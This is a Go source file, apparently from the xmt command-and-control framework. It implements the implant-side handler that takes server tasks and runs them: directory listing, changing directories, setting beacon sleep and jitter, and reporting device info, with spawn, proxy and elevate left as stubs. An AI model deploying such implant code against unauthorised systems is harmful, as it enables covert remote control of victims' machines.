package c2

import (
	"io/fs"
	"os"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
)

const ret404Tasks = false

// DefaultClientMux is the default Session Mux instance that handles the default C2 server and client functions.
// This operates cleanly with the default Server Mux instance.
var DefaultClientMux = MuxFunc(defaultClientMux)

// Mux is an interface that handles Packets when they arrive for Processing.
type Mux interface {
	Handle(*Session, *com.Packet) bool
}

// MuxFunc is the definition of a Mux Handler func. Once wrapped as a 'MuxFunc', these function aliases can be also
// used in place of the Mux interface.
type MuxFunc func(*Session, *com.Packet) bool

func defaultClientMux(s *Session, n *com.Packet) bool {
	if n.ID < task.MvTime {
		return false
	}
	if cout.Enabled {
		s.log.Info("[%s/MuX] Received packet %q.", s.ID, n)
	}
	if n.ID < RvResult {
		var (
			r      = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
			v, err = internalTask(s, n, r)
		)
		if v {
			if err != nil {
				if r.Clear(); cout.Enabled {
					s.log.Error("[%s/MuX] Error during Job %d runtime: %s!", s.ID, n.Job, err)
				}
				r.Flags |= com.FlagError
				r.WriteString(err.Error())
			}
			s.queue(r)
			return true
		}
		r = nil
	}
	t := task.Mappings[n.ID]
	if t == nil {
		if cout.Enabled {
			s.log.Warning("[%s/MuX] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
		}
		if ret404Tasks {
			r := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID, Flags: com.FlagError}
			r.WriteString("no TaskID mapping found")
			s.queue(r)
		}
		return false
	}
	go executeTask(t, s, n)
	return true
}

// Handle satisfies the Mux interface requirement and will process the received Packet. This function allows
// Wrapped MuxFunc objects to be used directly in place of more complex Mux definitions.
func (m MuxFunc) Handle(s *Session, n *com.Packet) bool {
	return m(s, n)
}
func executeTask(t task.Tasker, s *Session, n *com.Packet) {
	if cout.Enabled {
		s.log.Info("[%s/TasK] Starting Task with JobID %d.", s.ID, n.Job)
	}
	var (
		r   = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
		err = t(s.ctx, n, r)
	)
	if n.Clear(); err != nil {
		if r.Clear(); cout.Enabled {
			s.log.Error("[%s/TasK] Received error during JobID %d Task runtime: %s!", s.ID, n.Job, err)
		}
		r.Flags |= com.FlagError
		r.WriteString(err.Error())
	} else if cout.Enabled {
		s.log.Debug("[%s/TasK] Task with JobID %d completed!", s.ID, n.Job)
	}
	if err = s.write(false, r); err != nil {
		if cout.Enabled {
			s.log.Error("[%s/TasK] Received error sending Task results: %s!", s.ID, err)
		}
	}
}
func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
	switch n.ID {
	case task.MvPwd:
		d, err := syscall.Getwd()
		if err != nil {
			return true, err
		}
		w.WriteString(d)
		return true, nil
	case task.MvCwd:
		d, err := n.StringVal()
		if err != nil {
			return true, err
		}
		if err := syscall.Chdir(device.Expand(d)); err != nil {
			return true, err
		}
		return true, nil
	case task.MvList:
		d, err := n.StringVal()
		if err != nil {
			return true, err
		}
		if len(d) == 0 {
			d = "."
		} else {
			d = device.Expand(d)
		}
		s, err := os.Stat(d)
		if err != nil {
			return true, err
		}
		if !s.IsDir() {
			w.WriteUint32(1)
			w.WriteString(s.Name())
			w.WriteInt32(int32(s.Mode()))
			w.WriteInt64(s.Size())
			w.WriteInt64(s.ModTime().Unix())
			return true, nil
		}
		var l []fs.DirEntry
		if l, err = os.ReadDir(d); err != nil && len(l) == 0 {
			return true, err
		}
		w.WriteUint32(uint32(len(l)))
		for i := range l {
			w.WriteString(l[i].Name())
			if x, err := l[i].Info(); err == nil {
				w.WriteInt32(int32(x.Mode()))
				w.WriteInt64(x.Size())
				w.WriteInt64(x.ModTime().Unix())
				continue
			}
			w.WriteInt32(0)
			w.WriteInt64(0)
			w.WriteInt64(0)
		}
		return true, nil
	case task.MvTime:
		j, err := n.Uint8()
		if err != nil {
			return true, err
		}
		d, err := n.Int64()
		if err != nil {
			return true, err
		}
		if j > 100 {
			j = 100
		}
		if s.jitter = j; d > 0 {
			s.sleep = time.Duration(d)
		}
		return true, nil
	case task.MvSpawn:
		// TODO: Handle spawn code here.
		return true, nil
	case task.MvProxy:
		// TODO: Handle proxy code here.
		return true, nil
	case task.MvElevate:
		return true, nil
	case task.MvRefresh:
		if err := device.Local.Refresh(); err != nil {
			return true, err
		}
		return true, device.Local.MarshalStream(w)
	}
	return false, nil
}

// stream will act as a data.Writer
//  will allow for writes up until X, then will
//  send packet using the 'queue' or 'send' functions of the 's' Session.
//
// Unset data will be sent on a close call or flush.
//
//  Flag Count will be incremented before send, so
//   first packet will be Current: 1, Max: 2
//   so we can keep scaling the window.
//   A close call with an empty flag will NOT frag.
//   A close call with no extra data will close the frag by sending an
//    additional frag setting the max.
//
